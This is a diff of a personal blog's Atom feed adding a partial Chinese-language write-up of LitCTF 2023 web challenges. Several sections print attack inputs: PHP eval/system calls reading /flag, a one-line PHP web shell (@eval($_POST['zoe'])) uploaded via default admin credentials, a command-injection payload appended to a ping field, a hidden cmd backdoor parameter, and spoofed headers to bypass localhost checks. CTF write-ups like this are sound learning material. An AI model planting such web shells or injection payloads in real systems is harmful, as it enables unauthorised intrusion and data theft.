@@ -3,7 +3,51 @@
     <id>https://hq185187.github.io</id>
     <title>welcome to my blog</title>
     <link href="https://hq185187.github.io" />
-    <updated>2023-05-12T08:31:39.086Z</updated>
+    <updated>2023-05-14T12:20:25.426Z</updated>
+    <entry>
+        <id>https://hq185187.github.io/2023/05/14/LitCTF2023/</id>
+        <title>LitCTF2023(部分)</title>
+        <link rel="alternate" href="https://hq185187.github.io/2023/05/14/LitCTF2023/"/>
+        <content type="html">&lt;h2 id=&#34;1我flag呢&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1我flag呢&#34;&gt;#&lt;/a&gt; 1. 我 Flag 呢？&lt;/h2&gt;
+&lt;p&gt;F12 查看源代码&lt;/p&gt;
+&lt;h2 id=&#34;2导弹迷踪&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2导弹迷踪&#34;&gt;#&lt;/a&gt; 2. 导弹迷踪&lt;/h2&gt;
+&lt;p&gt;查看源代码找到 game.js 文件，找到 {return ‘GOT F|L|A|G {y0u_w1n_th1s_!!!}’;}, 以 NSSCTF 形式交就可以&lt;br&gt;
+！[[Pasted image 20230514194556.png]]&lt;/p&gt;
+&lt;h2 id=&#34;3php是世界上最好的语言&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3php是世界上最好的语言&#34;&gt;#&lt;/a&gt; 3.PHP 是世界上最好的语言！！&lt;/h2&gt;
+&lt;p&gt;可以之间运行 php 代码&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;system&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ls /&amp;#x27;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;system&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;cat /flag&amp;#x27;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;4follow-me-and-hack-me&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4follow-me-and-hack-me&#34;&gt;#&lt;/a&gt; 4.Follow me and hack me&lt;/h2&gt;
+&lt;p&gt;hackbar 传参&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;post:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Challenge=i&amp;#x27;m_c0m1ng&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;get&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?CTF=Lit2023&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;5vim-yyds&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5vim-yyds&#34;&gt;#&lt;/a&gt; 5.Vim yyds&lt;/h2&gt;
+&lt;p&gt;根据题目提示是 vim 信息泄露，文件后缀名是 &lt;code&gt;.index.php.swp&lt;/code&gt; &lt;br&gt;
+ 下载的文件放到 kali 恢复一下，(vim -r index.php.swp), 看代码知道用 post 方式传一个 password, 值为 base64 加密的 &lt;code&gt;Give_Me_Your_Flag&lt;/code&gt; , 就可以执行 post 传的 cmd 的命令&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;amp;cmd=cat /flag&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;6作业管理系统&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6作业管理系统&#34;&gt;#&lt;/a&gt; 6. 作业管理系统&lt;/h2&gt;
+&lt;p&gt;源代码提示默认用户名密码 admin, 登录进去之间传马，&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; @&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;zoe&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;phpinfo&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;直接改 url 到 zoe.php,hackbar 传 zoe=system (‘cat /flag’);&lt;br&gt;
+ 或者不嫌麻烦可以蚁剑连接，密码 zoe&lt;/p&gt;
+&lt;h2 id=&#34;71zjs&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#71zjs&#34;&gt;#&lt;/a&gt; 7.1zjs&lt;/h2&gt;
+&lt;h2 id=&#34;8http-pro-max-plus&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8http-pro-max-plus&#34;&gt;#&lt;/a&gt; 8.Http pro max plus&lt;/h2&gt;
+&lt;p&gt;经典的签到题&lt;br&gt;
+先本地访问：X-Forwarded-For: 127.0.0.1 不行，换 Client-Ip: 127.0.0.1&lt;br&gt;
+ 伪造来源：Referer: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Bvcm5odWIuY29t&#34;&gt;pornhub.com&lt;/span&gt;&lt;br&gt;
+ 改浏览器：User-Agent: Chrome&lt;br&gt;
+ 挂代理：这里新学到了一个 Vis&lt;br&gt;
+Via: Clash.win&lt;br&gt;
+ 然后提示去 /wtfwtfwtfwtf.php&lt;br&gt;
+ 看源代码发现 /sejishikong.php&lt;br&gt;
+ 进入得到 flag&lt;br&gt;
+![[Pasted image 20230513183204.png]]&lt;/p&gt;
+&lt;h2 id=&#34;9ping&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#9ping&#34;&gt;#&lt;/a&gt; 9.Ping&lt;/h2&gt;
+&lt;p&gt;看源代码发现对输入进行正则表达式过滤，没办法换个思路：抓包&lt;br&gt;
+发现可以直接在 command=127.0.0.1 后面加任何命令&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;command=127.0.0.1||cat /flag&amp;amp;ping=Ping&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;![[Pasted image 20230513102259.png]]&lt;/p&gt;
+</content>
+        <updated>2023-05-14T12:20:25.426Z</updated>
+    </entry>
     <entry>
         <id>https://hq185187.github.io/2023/05/12/nssctf2/</id>
         <title>NSSCTF2</title>
